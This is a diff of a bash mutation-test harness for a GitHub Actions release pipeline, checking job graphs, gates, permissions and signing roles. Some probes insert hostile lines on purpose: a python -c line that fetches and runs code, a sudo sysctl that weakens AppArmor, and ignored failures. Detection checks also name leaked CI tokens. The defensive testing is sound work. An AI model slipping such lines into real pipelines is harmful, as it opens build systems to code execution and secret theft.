 probe apk              "AC3 python -c fetching and running code"                    'L[:1] + ["python3 -c \"import urllib.request\""] + L[1:]'
 probe apk              "AC3 an unlisted script"                                     'L[:1] + ["bash bin/anything.sh"] + L[1:]'
 probe apk              "AC3 a failure ignored with || :"                            'L[:5] + [L[5] + " || :"] + L[6:]'
@@ -868,9 +755,6 @@ probe assemble "AC3 the verification wrapped in a never-true if (rule 58)" \
         + L[ix("chain-verify.py bind"):][:1] + ["fi"] + L[ix("chain-verify.py bind") + 1:])'
 probe apk              "AC3 a case dispatch instead of one file per kind" \
        '["case \"$1\" in", "apk)"] + L + [";;", "esac"]'
-probe apk              "AC3 admission after the build started"                      'L[:5] + [L[1]] + L[5:]'
-probe apk              "AC3 GH_TOKEN not unset after admission (cache's scripts would see it)" '[l for l in L if l != "unset GH_TOKEN"]'
-probe apk              "AC3 GH_TOKEN unset in the wrong place"                      'L[:2] + L[3:5] + ["unset GH_TOKEN"] + L[5:]'
 probe apk "AC6 the stage runs the sysctl itself (cache's scripts do)" \
        'L[:4] + ["sudo sysctl -w kernel.apparmor_restrict_unprivileged_userns=0"] + L[4:]'
 probe assemble         "AC6 the stage wraps cache's script in unshare" \
@@ -903,8 +787,6 @@ probe assemble         "AC3 one apk directory not bound (a bind line missing)" \
 probe assemble         "AC3 the files not bound to the record (the bind lines missing)" '[l for l in L if "chain-verify.py bind" not in l]'
 probe assemble         "AC3 bound with another step name (a Rebuild record can stand in)" \
        '[re.sub(r"--step (?!rapk\b)\S+", "--step rapk", l) for l in L]'
-probe assemble         "AC3 the admission baseline written BEFORE the files are bound" \
-       'move(ix("admission-baseline"), ix("chain-verify.py bind"))'
 probe assemble "AC3 bound as a signed record (the building job's record is local and unsigned)" '[l.replace("bind --local ", "bind ") for l in L]'
 probe assemble "AC3 bound to a record named like a signed one" \
        '[l.replace("-collection.local.json", "-collection.json") for l in L]'
@@ -938,17 +820,13 @@ probe assemble "ARM --digests passed on every items-merge" \
        '[l + " --digests digests.json" if "items-merge" in l and "--digests" not in l else l for l in L]'
 probe assemble "ARM --digests missing from the apk items-merge (the array is not used)" \
        '[re.sub(r" \"?\$\{digests\[@\]\}\"?", "", l) for l in L]'
-probe assemble "ARM admission-baseline run for the snapshot steps too (a copy after the binds)" \
-       '(L[:ix("chain-verify.py bind", True) + 1] + [L[ix("admission-baseline")]]
-        + L[ix("chain-verify.py bind", True) + 1:])'
-probe assemble "ARM admission-baseline taken out of the apk step" '[l for l in L if "admission-baseline" not in l]'
 probe assemble "ARM a branch of an if added beside the case blocks" \
        '(L[:ix("items-merge")] + ["if [ \"$1\" = apk ]; then"] + L[ix("items-merge"):][:1] + ["fi"]
         + L[ix("items-merge") + 1:])'
 probe assemble "ARM the version of a snapshot step taken from the tag (the snapshot version replaced)" \
-       '[l.replace("0.0.0-rc.1", "${tag#v}") for l in L]'
+       '[l.replace("0.0.0-rc.1", "${version#v}") for l in L]'
 probe assemble "ARM the version of a release step hard-wired to the snapshot version (the tag expression replaced)" \
-       '[l.replace("${tag#v}", "0.0.0-rc.1") for l in L]'
+       '[l.replace("${version#v}", "0.0.0-rc.1") for l in L]'
 probe assemble "ARM the snapshot version taken out (the snapshot arm has no version)" \
        '[l for l in L if "0.0.0-rc.1" not in l]'
 probe assemble "ARM the version missing from the items merge" \
@@ -1496,17 +1374,16 @@ if miss:
 PY
 then ok "AC16 every archive/ path the stage scripts read is held by the stored archive"; else bad "AC16 every archive/ path the stage scripts read is held by the stored archive"; fi
 # ---- the job graph of release.yml (REQ-CHAIN-005-AC5) -----------------------------------------------------------------------------------------
-# The known-good graph, written out from the rulings of cache#921 (not read from the shape file): fifteen chain jobs in one file, each with its needs, its if (gate G on build-freeze, guard S on the sign jobs,
+# The known-good graph, written out from the rulings of cache#921 (not read from the shape file): fifteen chain jobs in one file, each with its needs, its if (gate G on build-apk, guard S on the sign jobs,
 # and on release, `inputs.mode != 'snapshot'` on the Check jobs), its permissions and its environment; the KMS role as the job env of the three sign jobs only.
 python3 - "$work" <<'PY'
 import sys
 w = sys.argv[1]
-G = "${{ (github.event_name == 'push' && (startsWith(github.ref, 'refs/tags/v') || startsWith(github.ref, 'refs/heads/release/v'))) || inputs.dry-run == true || inputs.mode == 'snapshot' }}"
+G = "${{ (github.event_name == 'push' && (startsWith(github.ref, 'refs/tags/v') || startsWith(github.ref, 'refs/heads/release/'))) || inputs.dry-run == true || inputs.mode == 'snapshot' }}"
 S = "inputs.mode != 'snapshot' && github.event_name == 'push' && startsWith(github.ref, 'refs/tags/v') && startsWith(github.workflow_ref, format('{0}/.github/workflows/release.yml@', github.repository))"
-GV_IF = "${{ inputs.mode != 'snapshot' && ((github.event_name == 'push' && (startsWith(github.ref, 'refs/tags/v') || startsWith(github.ref, 'refs/heads/release/v'))) || inputs.dry-run == true) }}"   # check-govulncheck has no needs: the ref guard keeps it off on main
+GV_IF = "${{ inputs.mode != 'snapshot' && ((github.event_name == 'push' && (startsWith(github.ref, 'refs/tags/v') || startsWith(github.ref, 'refs/heads/release/'))) || inputs.dry-run == true) }}"   # check-govulncheck has no needs: the ref guard keeps it off on main
 SIGN_IF, AFTER_IF, CHECK_IF = "${{ %s }}" % S, "${{ %s }}" % S, "${{ inputs.mode != 'snapshot' }}"
 KMS = "    env:\n      AWS_ROLE_ARN: arn:aws:iam::821302803867:role/fosterstack-cache-release-signing\n      AWS_REGION: us-east-1\n      RELEASE_KMS_KEY_REF: awskms:///alias/fosterstack-release-signing\n"
-ADMIT = {"contents": "read", "actions": "read", "checks": "read", "statuses": "read", "pull-requests": "read"}
 def job(name, needs=None, if_=None, perm=None, env=None, extra=""):
     out = "  %s:\n" % name
     if needs: out += "    needs: %s\n" % needs
@@ -1518,7 +1395,7 @@ def job(name, needs=None, if_=None, perm=None, env=None, extra=""):
     return out + "    steps: []\n"
 SIGNP = {"contents": "read", "id-token": "write"}
 text = ("name: Release\non:\n  push:\n    tags: [\"v*\"]\n  workflow_dispatch:\n    inputs:\n      dry-run:\n        type: boolean\n        default: false\npermissions: {}\njobs:\n"
-        + job("build-freeze", None, G) + job("build-apk", "build-freeze", None, ADMIT) + job("build-assemble", "build-apk")
+        + job("build-apk", None, G) + job("build-assemble", "build-apk")
         + job("sign", "build-assemble", SIGN_IF, SIGNP, "sign", KMS)
         + job("rebuild-apk", "build-assemble") + job("rebuild-assemble", "rebuild-apk")
         + job("sign-rebuild", "[build-assemble, rebuild-assemble, sign]", SIGN_IF, SIGNP, "sign", KMS)
@@ -1565,7 +1442,7 @@ text = ("name: Release\non:\n  push:\n    tags: [\"v*\"]\n  workflow_dispatch:\n
     steps:
       - run: echo ${{ secrets.AUDITOR_APP_ID }}
   patch-failed:
-    needs: [build-freeze, build-apk, build-assemble, sign, rebuild-apk, rebuild-assemble, sign-rebuild, check-govulncheck, check, sign-check, release-compare, release-verify, hostile-verify, hostile-verdict, release]
+    needs: [build-apk, build-assemble, sign, rebuild-apk, rebuild-assemble, sign-rebuild, check-govulncheck, check, sign-check, release-compare, release-verify, hostile-verify, hostile-verdict, release]
     if: ${{ inputs.mode != 'snapshot' && always() && (contains(needs.*.result, 'failure') || needs.release.result == 'cancelled') && startsWith(github.ref, 'refs/tags/v') && github.event_name != 'workflow_dispatch' && !inputs.dry-run }}
     runs-on: ubuntu-latest
     permissions:
@@ -1583,7 +1460,7 @@ open(w + "/release.yml", "w").write(text)
 PY
 expect ok "005-AC5 fixture: the fifteen chain jobs with their needs, ifs, permissions and environments, the sign jobs holding the KMS role; other jobs as specified" "" graph "$work/release.yml"
 gr() { replace "$work/release.yml" "$work/$1.yml" "$3" "$4" && expect caught "$2" "$5" graph "$work/$1.yml"; return 0; }
-GATE_BODY="(github.event_name == 'push' && (startsWith(github.ref, 'refs/tags/v') || startsWith(github.ref, 'refs/heads/release/v'))) || inputs.dry-run == true || inputs.mode == 'snapshot'"
+GATE_BODY="(github.event_name == 'push' && (startsWith(github.ref, 'refs/tags/v') || startsWith(github.ref, 'refs/heads/release/'))) || inputs.dry-run == true || inputs.mode == 'snapshot'"
 GATE="\${{ $GATE_BODY }}"
 OLDDRY="\${{ !cancelled() && (needs.admission.result == 'success' || inputs.dry-run) }}"
 TAGONLY="\${{ startsWith(github.ref, 'refs/tags/v') }}"
@@ -1598,10 +1475,9 @@ gr n3  "005-AC5 rebuild-assemble does not wait for rebuild-apk" '  rebuild-assem
 gr n4  "005-AC5 check waits for rebuild-assemble" '  check:\n    needs: [check-govulncheck, build-assemble]' '  check:\n    needs: [check-govulncheck, build-assemble, rebuild-assemble]' "check must need exactly"
 gr n6  "005-AC5 check does not wait for check-govulncheck (the govulncheck binary would not exist)" '  check:\n    needs: [check-govulncheck, build-assemble]' '  check:\n    needs: [build-assemble]' "check must need exactly"
 gr n7  "005-AC5 check does not wait for build-assemble" '  check:\n    needs: [check-govulncheck, build-assemble]' '  check:\n    needs: [check-govulncheck]' "check must need exactly"
-gr n8  "005-AC5 check-govulncheck waits for another job" '  check-govulncheck:\n' '  check-govulncheck:\n    needs: build-freeze\n' "check-govulncheck must need exactly"
+gr n8  "005-AC5 check-govulncheck waits for another job" '  check-govulncheck:\n' '  check-govulncheck:\n    needs: build-apk\n' "check-govulncheck must need exactly"
 gr n9  "005-AC5 sign does not need build-assemble" '  sign:\n    needs: build-assemble' '  sign:\n    needs: build-apk' "sign must need exactly"
-gr n10 "005-AC5 build-apk does not wait for build-freeze" '  build-apk:\n    needs: build-freeze' '  build-apk:\n    needs: []' "build-apk must need exactly"
-gr n11 "005-AC5 build-assemble does not wait for build-apk" '  build-assemble:\n    needs: build-apk' '  build-assemble:\n    needs: build-freeze' "build-assemble must need exactly"
+gr n11 "005-AC5 build-assemble does not wait for build-apk" '  build-assemble:\n    needs: build-apk' '  build-assemble:\n    needs: []' "build-assemble must need exactly"
 gr n12 "005-AC5 sign-rebuild does not wait for rebuild-assemble" '  sign-rebuild:\n    needs: [build-assemble, rebuild-assemble, sign]' '  sign-rebuild:\n    needs: [build-assemble, sign]' "sign-rebuild must need exactly"
 gr n12b "005-AC5 sign-rebuild does not wait for sign (on a tag Sign verifies Build's records first)" '  sign-rebuild:\n    needs: [build-assemble, rebuild-assemble, sign]' '  sign-rebuild:\n    needs: [build-assemble, rebuild-assemble]' "sign-rebuild must need exactly"
 gr n13 "005-AC5 sign-check does not wait for check" '  sign-check:\n    needs: [build-assemble, check, sign]' '  sign-check:\n    needs: [build-assemble, sign]' "sign-check must need exactly"
@@ -1616,16 +1492,15 @@ gr n20 "005-AC5 release-verify does not need release-compare" '  release-verify:
 gr n21 "005-AC5 release does not need release-verify" 'needs: [release-verify, release-compare, hostile-verdict]' 'needs: [release-compare, hostile-verdict]' "release must need exactly"
 gr n22 "005-AC5 release does not need release-compare" 'needs: [release-verify, release-compare, hostile-verdict]' 'needs: [release-verify, hostile-verdict]' "release must need exactly"
 gr n23 "005-AC5 release does not need hostile-verdict (it would publish with a red hostile verdict)" 'needs: [release-verify, release-compare, hostile-verdict]' 'needs: [release-verify, release-compare]' "release must need exactly"
-# if: gate G on build-freeze only, guard S on the sign jobs and on release (REQ-CHAIN-005-AC5, REQ-CHAIN-007-AC14), `inputs.mode != 'snapshot'` on the Check jobs, none elsewhere
-gr i1  "005-AC5 build-freeze without the gate G (it would run on every push and the daily cron)" "  build-freeze:\n    if: $GATE\n" "  build-freeze:\n" "build-freeze must carry exactly the if"
-gr i2  "005-AC5 build-freeze gated by always()" "  build-freeze:\n    if: $GATE\n" "  build-freeze:\n    if: always()\n" "build-freeze must carry exactly the if"
-gr i3  "005-AC5 build-freeze gated by the tag test alone (a dry run on a branch would never run)" "  build-freeze:\n    if: $GATE\n" "  build-freeze:\n    if: $TAGONLY\n" "build-freeze must carry exactly the if"
-gr i4  "005-AC5 gate G with an extra conjunct" "  build-freeze:\n    if: $GATE\n" "  build-freeze:\n    if: \${{ ($GATE_BODY) && github.actor != 'x' }}\n" "build-freeze must carry exactly the if"
-gr i5  "005-AC5 gate G without the snapshot call (the callers' snapshot build would never start)" "  build-freeze:\n    if: $GATE\n" "  build-freeze:\n    if: \${{ (github.event_name == 'push' && (startsWith(github.ref, 'refs/tags/v') || startsWith(github.ref, 'refs/heads/release/v'))) || inputs.dry-run == true }}\n" "build-freeze must carry exactly the if"
-gr i6  "005-AC5 a manual workflow_dispatch on a v* tag cannot satisfy G: the gate widened to dispatch is refused" "  build-freeze:\n    if: $GATE\n" "  build-freeze:\n    if: \${{ (github.event_name != 'schedule' && (startsWith(github.ref, 'refs/tags/v') || startsWith(github.ref, 'refs/heads/release/v'))) || inputs.dry-run == true || inputs.mode == 'snapshot' }}\n" "build-freeze must carry exactly the if"
-gr i7  "005-AC5 the old dry-run gate with needs.admission on build-freeze (admission is gone; on a tag push everything would be skipped)" "  build-freeze:\n    if: $GATE\n" "  build-freeze:\n    if: $OLDDRY\n" "build-freeze must carry exactly the if"
-gr i8  "005-AC5 build-apk with an if (it runs after build-freeze through needs)" '  build-apk:\n    needs: build-freeze\n' '  build-apk:\n    needs: build-freeze\n    if: always()\n' "build-apk must carry no if"
-gr i9  "005-AC5 rebuild-apk with the gate G (only build-freeze carries it)" '  rebuild-apk:\n    needs: build-assemble\n' "  rebuild-apk:\n    needs: build-assemble\n    if: $GATE\n" "rebuild-apk must carry no if"
+# if: gate G on build-apk only, guard S on the sign jobs and on release (REQ-CHAIN-005-AC5, REQ-CHAIN-007-AC14), `inputs.mode != 'snapshot'` on the Check jobs, none elsewhere
+gr i1  "005-AC5 build-apk without the gate G (it would run on every push and the daily cron)" "  build-apk:\n    if: $GATE\n" "  build-apk:\n" "build-apk must carry exactly the if"
+gr i2  "005-AC5 build-apk gated by always()" "  build-apk:\n    if: $GATE\n" "  build-apk:\n    if: always()\n" "build-apk must carry exactly the if"
+gr i3  "005-AC5 build-apk gated by the tag test alone (a dry run on a branch would never run)" "  build-apk:\n    if: $GATE\n" "  build-apk:\n    if: $TAGONLY\n" "build-apk must carry exactly the if"
+gr i4  "005-AC5 gate G with an extra conjunct" "  build-apk:\n    if: $GATE\n" "  build-apk:\n    if: \${{ ($GATE_BODY) && github.actor != 'x' }}\n" "build-apk must carry exactly the if"
+gr i5  "005-AC5 gate G without the snapshot call (the callers' snapshot build would never start)" "  build-apk:\n    if: $GATE\n" "  build-apk:\n    if: \${{ (github.event_name == 'push' && (startsWith(github.ref, 'refs/tags/v') || startsWith(github.ref, 'refs/heads/release/'))) || inputs.dry-run == true }}\n" "build-apk must carry exactly the if"
+gr i6  "005-AC5 a manual workflow_dispatch on a v* tag cannot satisfy G: the gate widened to dispatch is refused" "  build-apk:\n    if: $GATE\n" "  build-apk:\n    if: \${{ (github.event_name != 'schedule' && (startsWith(github.ref, 'refs/tags/v') || startsWith(github.ref, 'refs/heads/release/'))) || inputs.dry-run == true || inputs.mode == 'snapshot' }}\n" "build-apk must carry exactly the if"
+gr i7  "005-AC5 the old dry-run gate on build-apk (on a tag push everything would be skipped)" "  build-apk:\n    if: $GATE\n" "  build-apk:\n    if: $OLDDRY\n" "build-apk must carry exactly the if"
+gr i9  "005-AC5 rebuild-apk with the gate G (only build-apk carries it)" '  rebuild-apk:\n    needs: build-assemble\n' "  rebuild-apk:\n    needs: build-assemble\n    if: $GATE\n" "rebuild-apk must carry no if"
 gr i10 "005-AC5 sign without the guard S (it would run on every push and the daily cron)" "  sign:\n    needs: build-assemble\n    if: $SIGNIF\n" "  sign:\n    needs: build-assemble\n" "sign must carry exactly the if"
 gr i11 "005-AC5 sign gated by the tag test alone" "  sign:\n    needs: build-assemble\n    if: $SIGNIF\n" "  sign:\n    needs: build-assemble\n    if: $TAGONLY\n" "sign must carry exactly the if"
 gr i12 "005-AC5 sign without the push event in its if (a dispatch on a tag could sign)" "  sign:\n    needs: build-assemble\n    if: $SIGNIF\n" "  sign:\n    needs: build-assemble\n    if: \${{ inputs.mode != 'snapshot' && startsWith(github.ref, 'refs/tags/v') && startsWith(github.workflow_ref, format('{0}/.github/workflows/release.yml@', github.repository)) }}\n" "sign must carry exactly the if"
@@ -1642,9 +1517,9 @@ gr i24 "005-AC5 release-compare with an if (it runs after Check and the sign job
 gr i25 "005-AC5 release-verify with an if" '  release-verify:\n    needs: release-compare\n' '  release-verify:\n    needs: release-compare\n    if: ${{ !contains(github.ref_name, '"'-'"') }}\n' "release-verify must carry no if"
 gr i26 "005-AC5 check without its mode condition (it would run in a snapshot call)" "  check:\n    needs: [check-govulncheck, build-assemble]\n    if: \${{ inputs.mode != 'snapshot' }}\n" "  check:\n    needs: [check-govulncheck, build-assemble]\n" "check must carry exactly the if"
 gr i27 "005-AC5 check with the guard S (the Check jobs carry exactly inputs.mode != 'snapshot')" "  check:\n    needs: [check-govulncheck, build-assemble]\n    if: \${{ inputs.mode != 'snapshot' }}\n" "  check:\n    needs: [check-govulncheck, build-assemble]\n    if: $SIGNIF\n" "check must carry exactly the if"
-gr i28 "005-AC5 check-govulncheck without its mode condition" "  check-govulncheck:\n    if: \${{ inputs.mode != 'snapshot' && ((github.event_name == 'push' && (startsWith(github.ref, 'refs/tags/v') || startsWith(github.ref, 'refs/heads/release/v'))) || inputs.dry-run == true) }}\n" "  check-govulncheck:\n" "check-govulncheck must carry exactly the if"
-gr i28b "005-AC5 check-govulncheck back to the snapshot-only if (it has no needs: it would run on every push to main)" "  check-govulncheck:\n    if: \${{ inputs.mode != 'snapshot' && ((github.event_name == 'push' && (startsWith(github.ref, 'refs/tags/v') || startsWith(github.ref, 'refs/heads/release/v'))) || inputs.dry-run == true) }}\n" "  check-govulncheck:\n    if: \${{ inputs.mode != 'snapshot' }}\n" "check-govulncheck must carry exactly the if"
-gr i28c "005-AC5 check-govulncheck with a guard that lets a main push through" "  check-govulncheck:\n    if: \${{ inputs.mode != 'snapshot' && ((github.event_name == 'push' && (startsWith(github.ref, 'refs/tags/v') || startsWith(github.ref, 'refs/heads/release/v'))) || inputs.dry-run == true) }}\n" "  check-govulncheck:\n    if: \${{ inputs.mode != 'snapshot' && github.event_name != 'workflow_dispatch' }}\n" "check-govulncheck must carry exactly the if"
+gr i28 "005-AC5 check-govulncheck without its mode condition" "  check-govulncheck:\n    if: \${{ inputs.mode != 'snapshot' && ((github.event_name == 'push' && (startsWith(github.ref, 'refs/tags/v') || startsWith(github.ref, 'refs/heads/release/'))) || inputs.dry-run == true) }}\n" "  check-govulncheck:\n" "check-govulncheck must carry exactly the if"
+gr i28b "005-AC5 check-govulncheck back to the snapshot-only if (it has no needs: it would run on every push to main)" "  check-govulncheck:\n    if: \${{ inputs.mode != 'snapshot' && ((github.event_name == 'push' && (startsWith(github.ref, 'refs/tags/v') || startsWith(github.ref, 'refs/heads/release/'))) || inputs.dry-run == true) }}\n" "  check-govulncheck:\n    if: \${{ inputs.mode != 'snapshot' }}\n" "check-govulncheck must carry exactly the if"
+gr i28c "005-AC5 check-govulncheck with a guard that lets a main push through" "  check-govulncheck:\n    if: \${{ inputs.mode != 'snapshot' && ((github.event_name == 'push' && (startsWith(github.ref, 'refs/tags/v') || startsWith(github.ref, 'refs/heads/release/'))) || inputs.dry-run == true) }}\n" "  check-govulncheck:\n    if: \${{ inputs.mode != 'snapshot' && github.event_name != 'workflow_dispatch' }}\n" "check-govulncheck must carry exactly the if"
 gr i29 "005-AC5 check that survives a failed build (if: always())" "  check:\n    needs: [check-govulncheck, build-assemble]\n    if: \${{ inputs.mode != 'snapshot' }}\n" "  check:\n    needs: [check-govulncheck, build-assemble]\n    if: \${{ always() }}\n" "check must carry exactly the if"
 # environment and permissions (ruling 1: the three sign jobs are the only ones in the environment sign; the release job holds no KMS role and no id-token)
 AFTERIF="$SIGNIF"
@@ -1659,7 +1534,6 @@ gr p2  "ruling 1 the release job without packages write (it could not publish)" 
 gr p7  "ruling 1 sign with contents write" '      contents: read\n      id-token: write\n    steps: []' '      contents: write\n      id-token: write\n    steps: []' "sign must hold exactly the permissions"
 gr p8  "ruling 1 sign without id-token (it could not reach the KMS key)" '      contents: read\n      id-token: write\n    steps: []' '      contents: read\n    steps: []' "sign must hold exactly the permissions"
 gr p9  "ruling 1 check holds an id-token (only the four sign jobs ask for one in the chain)" '  check:\n    needs: [check-govulncheck, build-assemble]\n    if: ${{ inputs.mode != '"'snapshot'"' }}\n    runs-on: ubuntu-24.04\n    permissions:\n      contents: read\n' '  check:\n    needs: [check-govulncheck, build-assemble]\n    if: ${{ inputs.mode != '"'snapshot'"' }}\n    runs-on: ubuntu-24.04\n    permissions:\n      contents: read\n      id-token: write\n' "check must hold exactly the permissions"
-gr p10 "005-AC5 build-apk without the admission permissions (the required-checks check could not run)" '      checks: read\n' '' "build-apk must hold exactly the permissions"
 gr p11 "005-AC5 workflow-level permissions that write (every job would inherit them)" 'permissions: {}\njobs' 'permissions:\n  contents: write\njobs' "workflow-level permissions"
 gr p12 "005-AC5 workflow-level permissions of contents: read (the workflow-level block is empty, every job declares its own)" 'permissions: {}\njobs' 'permissions:\n  contents: read\njobs' "workflow-level permissions must be empty"
 # the KMS role: the job env of the four sign jobs and of no other job
@@ -1681,7 +1555,7 @@ PF_IF="\${{ inputs.mode != 'snapshot' && always() && (contains(needs.*.result, '
 PF_OLD="\${{ failure() && startsWith(github.ref, 'refs/tags/v') && github.event_name != 'workflow_dispatch' && !inputs.dry-run }}"
 gr r3a "R3 audit: patch-failed with the old failure()-only if (a cancelled/replaced pending release would open no issue)" "if: $PF_IF" "if: $PF_OLD" "patch-failed must carry exactly the if"
 gr r3b "R3 audit: patch-failed without any if" "    if: $PF_IF\n    runs-on: ubuntu-latest" "    runs-on: ubuntu-latest" "patch-failed must carry exactly the if"
-gr g44 "005-AC5 patch-failed that needs only build-freeze (it would open an issue for a stage it does not watch)" "    needs: [build-freeze, build-apk, build-assemble, sign, rebuild-apk, rebuild-assemble, sign-rebuild, check-govulncheck, check, sign-check, release-compare, release-verify, hostile-verify, hostile-verdict, release]" "    needs: [build-freeze]" "patch-failed must need exactly"
+gr g44 "005-AC5 patch-failed that needs only build-apk (it would open an issue for a stage it does not watch)" "    needs: [build-apk, build-assemble, sign, rebuild-apk, rebuild-assemble, sign-rebuild, check-govulncheck, check, sign-check, release-compare, release-verify, hostile-verify, hostile-verdict, release]" "    needs: [build-freeze]" "patch-failed must need exactly"
 FAST='  release-fast:\n    needs: [build-assemble, sign]\n    runs-on: ubuntu-latest\n    permissions:\n      contents: write\n    steps:\n      - run: gh release create v1\n  decide:'
 EARLY='  publish-early:\n    needs: [build-assemble, sign]\n    runs-on: ubuntu-latest\n    permissions:\n      contents: write\n'
 EARLY="$EARLY"'    steps:\n      - run: gh release create v1 dist/*\n  decide:'
@@ -1714,7 +1588,7 @@ replace "$work/release.yml" "$work/g47.yml" "  workflow_dispatch:\n    inputs:\n
 # environment, with the identity token for their own federation only) and the one call of persona-uat.yml (the release branch's persona run, REQ-UAT-001-AC1: needs build-assemble only, release mode only, publishes nothing).
 # lj builds release.yml with the two jobs inserted before `decide`, optionally mutates ONE text in them, and runs the judge on it.
 LJ_FINAL_IF="\${{ inputs.mode != 'snapshot' && startsWith(github.ref, 'refs/tags/v') && !contains(github.ref_name, '-rc') && !inputs.dry-run }}"
-LJ_PERSONA_IF="\${{ inputs.mode != 'snapshot' && vars.PERSONA_UAT_ENABLED == 'true' && github.event_name == 'push' && startsWith(github.ref, 'refs/heads/release/v') }}"
+LJ_PERSONA_IF="\${{ inputs.mode != 'snapshot' && vars.PERSONA_UAT_ENABLED == 'true' && github.event_name == 'push' && startsWith(github.ref, 'refs/heads/release/') }}"
 LJ_JOBS="  live-test-release:\n    needs: [release]\n    if: $LJ_FINAL_IF\n    runs-on: ubuntu-latest\n    environment: live-test\n    permissions:\n      contents: read\n      id-token: write\n    steps:\n      - run: echo final\n  persona-uat-rc:\n    needs: build-assemble\n    if: $LJ_PERSONA_IF\n    permissions:\n      contents: read\n      id-token: write\n    uses: ./.github/workflows/persona-uat.yml\n    with:\n      digests: \${{ needs.build-assemble.outputs.digests }}\n"
 lj() { # lj NAME LABEL OLD NEW ok|caught WORD   (OLD empty: no mutation)
   python3 - "$work/release.yml" "$work/lj-$1.yml" "$3" "$4" "$LJ_JOBS" <<'PY' || { bad "mutation did not apply (lj-$1): $3"; return 0; }
@@ -1773,7 +1647,7 @@ lj pu3 "REQ-UAT-001-AC1 persona-uat-rc that needs nothing" "  persona-uat-rc:\n 
 lj pu4 "REQ-UAT-001-AC1 persona-uat-rc with a write it does not need (packages)" "      id-token: write\n    uses: ./.github/workflows/persona-uat.yml" "      id-token: write\n      packages: write\n    uses: ./.github/workflows/persona-uat.yml" caught "exactly the permissions"
 lj pu5 "REQ-UAT-001-AC1 persona-uat-rc with contents write" "      contents: read\n      id-token: write\n    uses: ./.github/workflows/persona-uat.yml" "      contents: write\n      id-token: write\n    uses: ./.github/workflows/persona-uat.yml" caught "exactly the permissions"
 lj pu6 "REQ-UAT-001-AC1 persona-uat-rc without the snapshot exclusion (it would run in a snapshot call)" "inputs.mode != 'snapshot' && vars.PERSONA_UAT_ENABLED" "vars.PERSONA_UAT_ENABLED" caught "must carry exactly the if"
-lj pu7 "REQ-UAT-001-AC1 persona-uat-rc that also runs on a tag push (no release-branch conjunct)" " && startsWith(github.ref, 'refs/heads/release/v') }}\n    permissions" " }}\n    permissions" caught "must carry exactly the if"
+lj pu7 "REQ-UAT-001-AC1 persona-uat-rc that also runs on a tag push (no release-branch conjunct)" " && startsWith(github.ref, 'refs/heads/release/') }}\n    permissions" " }}\n    permissions" caught "must carry exactly the if"
 lj pu8 "REQ-UAT-001-AC1 persona-uat-rc without the PERSONA_UAT_ENABLED gate" "vars.PERSONA_UAT_ENABLED == 'true' && " "" caught "must carry exactly the if"
 lj pu9 "REQ-UAT-001-AC1 persona-uat-rc in an environment (the persona environment is entered by the called jobs, not by the call)" "  persona-uat-rc:\n    needs: build-assemble" "  persona-uat-rc:\n    environment: persona-uat\n    needs: build-assemble" caught "may not name an environment"
 lj pu10 "REQ-UAT-001-AC1 persona-uat-rc calls another workflow than persona-uat.yml" "    uses: ./.github/workflows/persona-uat.yml" "    uses: ./.github/workflows/ci.yml" caught "job-level uses"
@@ -1814,7 +1688,7 @@ expect caught "AC8 judge: ACTIONS_ID_TOKEN_REQUEST_TOKEN inside the base64 paylo
        ACTIONS_ID_TOKEN_REQUEST_TOKEN recordenv "$work/env_masked.json"
 expect caught "AC8 judge: ACTIONS_ID_TOKEN_REQUEST_URL" ACTIONS_ID_TOKEN_REQUEST_URL recordenv "$work/env_url.json"
 expect caught "AC8 judge: ACTIONS_RUNTIME_TOKEN" ACTIONS_RUNTIME_TOKEN recordenv "$work/env_runtime.json"
-expect caught "AC8 judge: GH_TOKEN (the admission token must not be recorded either)" GH_TOKEN recordenv "$work/env_ghtoken.json"
+expect caught "AC8 judge: GH_TOKEN" GH_TOKEN recordenv "$work/env_ghtoken.json"
 expect caught "AC8 judge: GITHUB_TOKEN" GITHUB_TOKEN recordenv "$work/env_githubtoken.json"
 expect caught "AC8 judge: a GitHub token value in any variable" "GitHub token" recordenv "$work/env_ghs.json"
 expect caught "AC8 judge: a compact JWT (the github attestor's raw token)" JWT recordenv "$work/env_githubatt.json"
@@ -1875,7 +1749,6 @@ else
   bad "with_timeout left a child that ignores TERM alive (exit $rc)"
 fi
 # run_stage DIR KIND MODE TAG [ENV=VAL...] -> the exit status (124 or 137 if it hangs)
-# GH_TOKEN is set as the apk job's Witness step sets it
 run_stage() {
   local dir=$1 kind=$2 mode=$3 tag=$4 words=() ref; shift 4
   # the assemble script takes the STEP only; its version comes from GITHUB_REF_NAME (tag minus v)
@@ -1885,7 +1758,7 @@ run_stage() {
   fi
   ( cd "$dir" && if with_timeout 120 env GITHUB_ACTIONS=true "$@" GITHUB_REF_NAME="${REF_NAME:-$tag}" TAG="$tag" ITEMS_MODE="$mode" \
         HARNESS_DIR="$root/bin" REAL_CV="$CV" \
-        GITHUB_SHA=0123456789abcdef0123456789abcdef01234567 GH_TOKEN=SENTINEL-GH-TOKEN PATH="$dir/bin:$PATH" \
+        GITHUB_SHA=0123456789abcdef0123456789abcdef01234567 PATH="$dir/bin:$PATH" \
         bash "./bin/build-stage-$(file_of "$kind").sh" ${words[@]+"${words[@]}"} \
           > stage.out 2> stage.err; then echo 0; else echo $?; fi )
 }
@@ -1918,8 +1791,8 @@ beh_apk() { # beh_apk TAGNAME SCRIPT MODE VERSIONTAG
   local t=$1 s=$2 mode=$3 v=$4 d="$work/b-apk-$1-$4" rc calls pk
   pk=$(oracle apkname standard "$v"); pk=${pk#fscache-}; pk=${pk%-r0.apk}
   mk "$d" apk "$s" "$mode" "$v"; rc=$(run_stage "$d" apk "$mode" "$v"); calls=$(cat "$d/calls.log" 2> /dev/null || true)
-  if [ "$rc" = 0 ] && [ "$(sed -n 1p <<< "$calls")" = "admit gh=yes" ] && [ "$(n_calls '^apk ' "$d")" = 2 ] && [ "$(n_calls '^version ' "$d")" = 2 ]; then
-    ok "AC3 $t apk $v: admission is the first call (and holds the token), then both variants build, then both version checks"
+  if [ "$rc" = 0 ] && [ "$(n_calls '^apk ' "$d")" = 2 ] && [ "$(n_calls '^version ' "$d")" = 2 ]; then
+    ok "AC3 $t apk $v: both variants build, then both version checks"
   else
     bad "AC3 $t apk $v: exit $rc, calls: $(tr '\n' '|' <<< "$calls" | cut -c1-200)"
   fi
@@ -1947,13 +1820,6 @@ beh_apk() { # beh_apk TAGNAME SCRIPT MODE VERSIONTAG
     bad "AC9 $t apk $v: out/items-apk.json differs from the oracle"
   fi
   if [ "$v" = v0.3.0 ]; then
-    mk "$d" apk "$s" "$mode" "$v"; run_stage "$d" apk "$mode" "$v" > /dev/null
